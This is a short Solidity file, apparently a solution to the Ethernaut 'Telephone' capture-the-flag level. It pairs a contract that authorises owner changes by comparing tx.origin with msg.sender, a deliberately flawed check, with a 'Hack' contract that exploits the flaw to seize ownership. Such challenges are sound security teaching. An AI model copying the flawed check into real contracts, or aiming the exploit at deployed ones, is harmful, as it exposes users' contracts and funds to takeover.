/**
 *Submitted for verification at Etherscan.io on 2022-07-10
*/

pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Hack {
  Telephone telephone;

  constructor(Telephone _telephone) public {
    telephone = _telephone;
  }

  function hack() public {
    telephone.changeOwner(msg.sender);
  }
}